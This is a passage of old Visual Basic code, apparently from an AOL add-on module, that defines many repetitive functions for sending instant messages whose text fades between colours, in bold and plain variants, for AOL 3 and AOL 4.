        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBoldBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AoL3_ImBoldBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImBoldBlueYellowBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function

Function AoL3_ImGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenPurpleGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenRedGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreenYellowGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyBlueGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyGreenGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyPurpleGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyRedGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImGreyYellowGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_ImSend (Who), ("" + Msg + "")
End Function
Function AoL3_ImBoldGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_ImSend (Who), ("<b>" + Msg + "")
End Function
